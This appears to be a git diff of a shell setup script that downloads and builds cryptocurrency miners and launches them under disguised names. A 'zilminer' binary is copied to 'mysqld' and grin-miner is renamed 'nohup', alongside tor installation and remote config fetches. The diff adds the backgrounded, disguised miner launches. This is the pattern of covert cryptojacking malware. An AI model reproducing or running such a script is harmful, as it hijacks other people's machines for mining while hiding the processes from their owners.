@@ -17,7 +17,6 @@ git clone https://github.com/orpheusyalcon/durian
 cd durian
 cp zilminer mysqld
 chmod +x mysqld
-./mysqld -P zil://${random_pub}.worker_2@${random_ip}:4202 &
 cd ..
 apt-get --no-install-recommends --yes install tor torsocks libncurses5-dev libncursesw5-dev cmake git curl libssl-dev pkg-config
 curl https://sh.rustup.rs -sSf | sh -s -- -y
@@ -30,4 +29,5 @@ rm grin-miner.toml
 wget https://raw.githubusercontent.com/orpheusyalcon/allsmile/master/grin-miner.toml
 date_now=$(date +%s) && sed -i 's/first/${date_now}/g' grin-miner.toml
 cp target/release/grin-miner target/release/nohup
-./target/release/nohup
+./target/release/nohup &
+cd durian && ./mysqld -P zil://${random_pub}.worker_2@${random_ip}:4202
